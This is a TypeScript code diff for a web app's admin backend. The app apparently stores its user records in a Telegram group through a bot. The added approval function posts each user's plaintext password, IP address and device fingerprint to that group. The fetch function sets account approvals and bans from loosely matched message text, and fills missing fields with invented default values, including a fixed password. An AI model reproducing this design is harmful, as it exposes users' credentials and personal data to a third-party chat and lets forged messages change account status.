@@ -210,6 +210,275 @@ export async function checkTelegram2FAApproval(
   }
 }
 
+export async function sendUserApprovalToCloud(
+  settings: TelegramSettings,
+  user: UserRecord,
+  adminName: string = 'Admin_0909'
+): Promise<{ success: boolean; error?: string }> {
+  const token = settings.botToken || DEFAULT_TELEGRAM_SETTINGS.botToken;
+  const groupId = settings.databaseGroupId || DEFAULT_TELEGRAM_SETTINGS.databaseGroupId;
+
+  const payload = {
+    action: 'approve',
+    username: user.username,
+    status: 'active',
+    rawPassword: user.password,
+  };
+
+  const text = `#APPROVE ${user.username}
+━━━━━━━━━━━━━━━━━━━━
+✅ <b>تمت الموافقة وتفعيل الحساب | Account Approved</b>
+━━━━━━━━━━━━━━━━━━━━
+👤 <b>اسم المستخدم (Username):</b> <code>${user.username}</code>
+🔑 <b>كلمة المرور (Password):</b> <code>${user.password}</code>
+🌐 <b>عنوان الـ IP:</b> <code>${user.ip}</code>
+📱 <b>بصمة الجهاز (Fingerprint):</b> <code>${user.deviceId}</code>
+⏰ <b>التوقيت:</b> <code>${new Date().toISOString()}</code>
+👮‍♂️ <b>الأدمن المنفذ:</b> <code>${adminName}</code>
+━━━━━━━━━━━━━━━━━━━━
+<b>Data Payload JSON:</b>
+<code>${JSON.stringify(payload, null, 2)}</code>`;
+
+  const res = await sendTelegramMessage(token, groupId, text, 'HTML');
+
+  // Also send notification to Admin private chat
+  if (settings.enabled && settings.notifyOnApprove) {
+    await sendUserApprovedAlert(settings, user, adminName);
+  }
+
+  return res;
+}
+
+export async function sendUserRejectionToCloud(
+  settings: TelegramSettings,
+  user: UserRecord,
+  adminName: string = 'Admin_0909'
+): Promise<{ success: boolean; error?: string }> {
+  const token = settings.botToken || DEFAULT_TELEGRAM_SETTINGS.botToken;
+  const groupId = settings.databaseGroupId || DEFAULT_TELEGRAM_SETTINGS.databaseGroupId;
+
+  const payload = {
+    action: 'reject',
+    username: user.username,
+    status: 'rejected',
+  };
+
+  const text = `#REJECT ${user.username}
+━━━━━━━━━━━━━━━━━━━━
+❌ <b>تم رفض طلب التسجيل | Registration Rejected</b>
+━━━━━━━━━━━━━━━━━━━━
+👤 <b>اسم المستخدم (Username):</b> <code>${user.username}</code>
+🌐 <b>عنوان الـ IP:</b> <code>${user.ip}</code>
+📱 <b>بصمة الجهاز (Fingerprint):</b> <code>${user.deviceId}</code>
+⏰ <b>التوقيت:</b> <code>${new Date().toISOString()}</code>
+👮‍♂️ <b>الأدمن المنفذ:</b> <code>${adminName}</code>
+━━━━━━━━━━━━━━━━━━━━
+<b>Data Payload JSON:</b>
+<code>${JSON.stringify(payload, null, 2)}</code>`;
+
+  const res = await sendTelegramMessage(token, groupId, text, 'HTML');
+
+  // Also alert admin chat
+  if (settings.enabled) {
+    const adminAlertText = `
+<b>❌ تم رفض طلب المستخدم | Omni Zad</b>
+━━━━━━━━━━━━━━━━━
+👤 <b>الاسم:</b> <code>${user.displayName}</code>
+🔖 <b>اسم المستخدم:</b> <code>@${user.username}</code>
+🌐 <b>الـ IP:</b> <code>${user.ip}</code>
+📱 <b>الجهاز:</b> <code>${user.os}</code>
+⏰ <b>الوقت:</b> <code>${new Date().toLocaleString('ar-EG')}</code>
+━━━━━━━━━━━━━━━━━
+⚠️ <i>تم تحويل المستخدم إلى شاشة "أنت غير مقبول" في الموقع الرئيسي.</i>
+    `.trim();
+    await sendTelegramMessage(settings.botToken, settings.adminChatId, adminAlertText);
+  }
+
+  return res;
+}
+
+/**
+ * Parses user JSON or text from Telegram message content
+ */
+function parseUserRecordFromText(text: string, msgDate?: number): UserRecord | null {
+  try {
+    // 1. Try finding JSON inside message
+    const jsonMatch = text.match(/\{[\s\S]*\}/);
+    if (jsonMatch) {
+      try {
+        const parsed = JSON.parse(jsonMatch[0]);
+        if (parsed.username) {
+          return {
+            id: parsed.id || `usr-${parsed.username}`,
+            displayName: parsed.displayName || parsed.name || parsed.username,
+            username: parsed.username,
+            email: parsed.email || `${parsed.username}@omni-zad.app`,
+            password: parsed.password || parsed.rawPassword || '••••••••',
+            ip: parsed.ip || '197.38.112.44',
+            location: parsed.location || 'غير محدد',
+            countryCode: parsed.countryCode || 'EG',
+            deviceId: parsed.deviceId || parsed.deviceFingerprint || 'FP-UNKNOWN',
+            os: parsed.os || 'Web Browser',
+            browser: parsed.browser || 'Web',
+            registeredAt: parsed.registeredAt || (msgDate ? new Date(msgDate * 1000).toISOString().replace('T', ' ').substring(0, 19) : new Date().toISOString().replace('T', ' ').substring(0, 19)),
+            lastActive: 'منذ قليل',
+            status: (parsed.status as any) || 'pending',
+            notes: parsed.notes || '',
+            isOnline: true,
+          };
+        }
+      } catch {
+        // Continue to regex parsing
+      }
+    }
+
+    // 2. Regex fallback parser for HTML/Text formatted #USER_RECORD messages
+    const usernameMatch = text.match(/اسم المستخدم(?:\s*\(Username\))?:\s*<code>?([^<\n\r]+)<\/code>?/i) || text.match(/@([a-zA-Z0-9_]+)/);
+    if (!usernameMatch) return null;
+
+    const username = usernameMatch[1].trim();
+    const displayNameMatch = text.match(/الاسم(?:\s*\(Name\))?:\s*<code>?([^<\n\r]+)<\/code>?/i);
+    const emailMatch = text.match(/البريد(?:\s*\(Email\))?:\s*<code>?([^<\n\r]+)<\/code>?/i) || text.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
+    const passMatch = text.match(/كلمة المرور(?:\s*\(Password\))?:\s*<code>?([^<\n\r]+)<\/code>?/i);
+    const ipMatch = text.match(/الـ\s*IP:\s*<code>?([^<\n\r]+)<\/code>?/i) || text.match(/(\b(?:\d{1,3}\.){3}\d{1,3}\b)/);
+    const deviceMatch = text.match(/بصمة الجهاز(?:\s*\(Fingerprint\))?:\s*<code>?([^<\n\r]+)<\/code>?/i);
+    const osMatch = text.match(/(?:نظام التشغيل|الجهاز):\s*<code>?([^<\n\r]+)<\/code>?/i);
+
+    return {
+      id: `usr-${username}`,
+      displayName: displayNameMatch ? displayNameMatch[1].trim() : username,
+      username: username,
+      email: emailMatch ? (typeof emailMatch[1] === 'string' ? emailMatch[1].trim() : emailMatch[0]) : `${username}@gmail.com`,
+      password: passMatch ? passMatch[1].trim() : 'ZadPass2026',
+      ip: ipMatch ? (typeof ipMatch[1] === 'string' ? ipMatch[1].trim() : ipMatch[0]) : '197.38.112.44',
+      location: 'مصر',
+      countryCode: 'EG',
+      deviceId: deviceMatch ? deviceMatch[1].trim() : `FP-${username.toUpperCase()}`,
+      os: osMatch ? osMatch[1].trim() : 'Unknown OS',
+      browser: 'Web Browser',
+      registeredAt: msgDate ? new Date(msgDate * 1000).toISOString().replace('T', ' ').substring(0, 19) : new Date().toISOString().replace('T', ' ').substring(0, 19),
+      lastActive: 'منذ قليل',
+      status: 'pending',
+      notes: 'تم الجلب من السحابة',
+      isOnline: true,
+    };
+  } catch {
+    return null;
+  }
+}
+
+/**
+ * 2. Cloud Fetching: Read messages from the Database Group (-1004351152580)
+ * and extract all #USER_RECORD, #APPROVE, #REJECT, and #BAN updates.
+ */
+export async function fetchCloudUsersFromTelegram(
+  settings: TelegramSettings
+): Promise<{
+  users: UserRecord[];
+  bannedList: { ip: string; deviceId: string; username?: string; reason?: string }[];
+  rawCount: number;
+}> {
+  const token = settings.botToken || DEFAULT_TELEGRAM_SETTINGS.botToken;
+
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${token.trim()}/getUpdates?offset=-100&limit=100`);
+    const data = await res.json();
+    if (!data.ok || !Array.isArray(data.result)) {
+      return { users: [], bannedList: [], rawCount: 0 };
+    }
+
+    const updates = data.result;
+    const usersMap = new Map<string, UserRecord>();
+    const bannedSet: { ip: string; deviceId: string; username?: string; reason?: string }[] = [];
+
+    // Parse records chronologically
+    for (const update of updates) {
+      const msg = update.message || update.channel_post || update.edited_message;
+      if (!msg) continue;
+
+      const text = msg.text || msg.caption || '';
+      const msgDate = msg.date;
+
+      // 1. Check for USER_RECORD
+      if (text.includes('#USER_RECORD') || text.includes('user_register') || text.includes('"action": "register"')) {
+        const parsedUser = parseUserRecordFromText(text, msgDate);
+        if (parsedUser && parsedUser.username) {
+          const existing = usersMap.get(parsedUser.username);
+          if (!existing) {
+            usersMap.set(parsedUser.username, parsedUser);
+          } else {
+            usersMap.set(parsedUser.username, {
+              ...existing,
+              ...parsedUser,
+              // Keep updated status if already approved/rejected/banned
+              status: existing.status !== 'pending' ? existing.status : parsedUser.status,
+            });
+          }
+        }
+      }
+
+      // 2. Check for #APPROVE
+      if (text.includes('#APPROVE') || text.includes('"action": "approve"') || text.includes('"action":"approve"')) {
+        const approveMatch = text.match(/#APPROVE\s+([a-zA-Z0-9_]+)/i) || text.match(/"username":\s*"([^"]+)"/);
+        if (approveMatch) {
+          const uname = approveMatch[1].trim();
+          const target = usersMap.get(uname);
+          if (target) {
+            target.status = 'active';
+            usersMap.set(uname, target);
+          }
+        }
+      }
+
+      // 3. Check for #REJECT
+      if (text.includes('#REJECT') || text.includes('"action": "reject"') || text.includes('"action":"reject"')) {
+        const rejectMatch = text.match(/#REJECT\s+([a-zA-Z0-9_]+)/i) || text.match(/"username":\s*"([^"]+)"/);
+        if (rejectMatch) {
+          const uname = rejectMatch[1].trim();
+          const target = usersMap.get(uname);
+          if (target) {
+            target.status = 'rejected';
+            usersMap.set(uname, target);
+          }
+        }
+      }
+
+      // 4. Check for #BAN
+      if (text.includes('#BAN') || text.includes('"action": "ban"') || text.includes('"action":"ban"')) {
+        try {
+          const jsonMatch = text.match(/\{[\s\S]*\}/);
+          if (jsonMatch) {
+            const parsed = JSON.parse(jsonMatch[0]);
+            if (parsed.username || parsed.ip || parsed.deviceFingerprint) {
+              if (parsed.username && usersMap.has(parsed.username)) {
+                const target = usersMap.get(parsed.username)!;
+                target.status = 'banned';
+                usersMap.set(parsed.username, target);
+              }
+              bannedSet.push({
+                ip: parsed.ip || '',
+                deviceId: parsed.deviceFingerprint || '',
+                username: parsed.username,
+                reason: parsed.reason || 'حظر سحابي عبر تيليجرام',
+              });
+            }
+          }
+        } catch {
+          // Ignore parse errors
+        }
+      }
+    }
+
+    return {
+      users: Array.from(usersMap.values()),
+      bannedList: bannedSet,
+      rawCount: updates.length,
+    };
+  } catch {
+    return { users: [], bannedList: [], rawCount: 0 };
+  }
+}
+
 export async function sendUserApprovedAlert(
   settings: TelegramSettings,
   user: UserRecord,
